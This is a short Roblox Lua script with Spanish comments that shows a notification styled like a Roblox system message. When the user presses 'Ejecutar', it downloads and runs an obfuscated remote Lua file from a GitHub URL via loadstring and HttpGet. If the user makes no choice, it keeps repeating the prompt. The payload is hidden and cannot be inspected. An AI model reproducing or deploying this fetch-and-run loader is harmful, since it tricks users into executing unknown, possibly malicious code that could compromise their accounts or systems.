--NOTIFICACION ESTILO SISTEMA DE ROBLOX CON OPCION PARA EJECUTAR SCRIPTS(O NO)

local StarterGui = game:GetService("StarterGui")

-- üîä Sonido de notificaci√≥n
local function playSound()
	local sound = Instance.new("Sound")
	sound.SoundId = "rbxassetid://6534947240"
	sound.Volume = 1
	sound.Parent = workspace
	sound:Play()
	game.Debris:AddItem(sound, 3)
end

-- üîó Funci√≥n para mostrar notificaci√≥n en loop
local function showNotification()
	local bindable = Instance.new("BindableFunction")
	bindable.OnInvoke = function(button)
		if button == "Ejecutar" then
			-- ‚úÖ Ejecutar script externo
			loadstring(game:HttpGet(('https://raw.githubusercontent.com/r3k33551-bot/Acortador-de-scripts/refs/heads/main/obf_135fT3c6G0da4X9yckPtKnzWk71fN10B6Z7LQ05T1jdGpaYKNVHxSZHX6caWltcj.lua.txt'), true))()
		elseif button == "Cancelar" then
			warn("Ejecuci√≥n cancelada por el usuario.")
		else
			-- ‚è≥ Si no eligi√≥ nada ‚Üí repetir notificaci√≥n
			task.delay(1, showNotification)
		end
	end

	-- üìå Mostrar notificaci√≥n con tu icono
	playSound()
	StarterGui:SetCore("SendNotification", {
		Title = "MIYKO",
		Text = "This script was made by MIYKO",
		Duration = 5,
		Button1 = "Ejecutar",
		Button2 = "Cancelar",
		Callback = bindable,
		Icon = "rbxassetid://134256414823554" -- üëà tu imagen
	})
end

-- ‚ñ∂Ô∏è Inicia el loop
showNotification()
